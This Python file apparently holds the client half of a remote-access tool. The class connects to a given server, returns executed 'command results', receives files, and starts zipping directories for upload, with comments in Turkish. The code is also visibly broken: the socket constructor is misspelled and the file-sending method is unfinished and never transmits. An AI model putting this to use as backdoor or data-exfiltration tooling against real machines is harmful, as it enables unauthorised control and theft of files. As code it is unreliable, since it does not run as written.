import socket
import zipfile
import os

DELIMETER = "<END_OF_RESULTS>"
CHUNKSIZE = 4 * 1024


class ClientConnection:

    def __init__(self):
        self.socket = socket.sockets(socket.AF_INET, socket . SOCK_STREAM)

    def Connect(self, server_ip, server_port):
        self.socket.connect((server_ip, server_port))
        self.server_ip = server_ip
        self.server_port = server_port

    def receive_data(self):
        self.data_in_bytes = self.socket.recv(1024)
        self.data = self.data_in_bytes.decode("utf-8")
        return self.data

    def send_data(self, data):
        self.data_in_bytes = bytes(data, "utf-8")
        self.socket.send(self.data_in_bytes)

    def send_command_result(self, command_result):
        data2send = command_result + DELIMETER

        data2send_bytes = data2send.encode()
        self.socket.sendall(data2send_bytes)

    def receive_file(self, filename):
        print("Receive file")

        with open(filename, "wb") as file:
            while True:
                chunk = self.socket.recv(CHUNKSIZE)

                if chunk.endswith(DELIMETER.encode()):
                    chunk = chunk[:-len(DELIMETER)]
                    file.write(chunk)
                    break
                file.write(chunk)

        print("[+] Completed")

    def send_file(self,  filename):
        print("Gonderilen Dosya : ", filename)

        # gonderilen datanin oncelikle directory olup  olamadigini bakiyoruz ve  .zip e ceviriyoruz
        if os.path.isdir(filename):
            zipped_name = filename + ".zip"
            zipf = zipfile.ZipFile(zipped_name, "w", zipfile.ZIP_DEFLATED)

    def close(self):
        self.socket.close()
